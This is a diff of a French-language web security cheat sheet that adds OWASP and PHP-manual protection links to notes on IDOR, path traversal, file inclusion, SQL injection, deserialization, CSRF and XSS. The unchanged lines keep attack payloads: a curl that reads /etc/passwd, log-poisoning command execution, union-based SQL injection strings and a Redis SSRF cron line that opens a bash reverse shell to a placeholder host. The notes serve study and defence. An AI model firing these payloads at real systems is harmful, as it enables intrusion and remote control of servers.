@@ -188,6 +188,7 @@ sudo systemctl restart httpd
 - IDOR
 - [Password Reset Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-feature)
 - [UUID - Sandwich Attack](https://github.com/Lupin-Holmes/sandwich)
+- https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
 
 ### JWT
 
@@ -205,13 +206,26 @@ sudo systemctl restart httpd
 ![](./images/api.gif)
 
 
+## Insecure code management
+
+- https://httpd.apache.org/docs/current/howto/htaccess.html
+- https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html
+- https://owasp.org/www-project-devsecops-guideline/latest/01a-Secrets-Management
+- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces
+
+
 ## Path Traversal
 
+- https://owasp.org/www-community/attacks/Path_Traversal
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
 
 ```bash
 curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
 ```
+
+`Protection`:
+
+- https://www.php.net/manual/fr/function.realpath.php
 
 ## File Inclusion
 
@@ -223,6 +237,8 @@ curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passw
 - https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/
 
 `Protection`: 
+
+- https://www.php.net/manual/fr/function.realpath.php
 
 ```php
 <?php
@@ -274,6 +290,8 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ## SQLi
 
 - https://phptherightway.com/#databases
+- `Protection`:
+- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
 
 ### BEUST: Blind,Error,Union,Stacked,Time-based
 
@@ -295,7 +313,7 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 
 ' union select 0,0,column_name,0 from information_schema.columns where table_name='chall' #
 
- ' union select id, origine, message, 0 from chall #
+' union select id, origine, message, 0 from chall #
 ```
 
 ### Pagination
@@ -412,8 +430,9 @@ php_flag engine off
 
 ### Deserialization
 
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
+- https://www.owasp.org/index.php/PHP_Object_Injection
 - https://www.saotn.org/exploit-php-mail-get-remote-code-execution/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
 
 ```php
 <?php
@@ -528,6 +547,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 - anti-CSRF tokens
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
 
 ```
 Header Set-Cookie: mettre le scope de l'attribut SameSite = None
@@ -555,7 +575,9 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
  - https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
 
-`Protection`: HTML-encode les entrées utilisateurs, CSP
+`Protection`: HTML-encode les entrées utilisateurs, CSP:
+  - `htmlspecialchars`: https://www.php.net/manual/fr/function.htmlspecialchars.php
+  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
 
 #### Reflected XSS
 
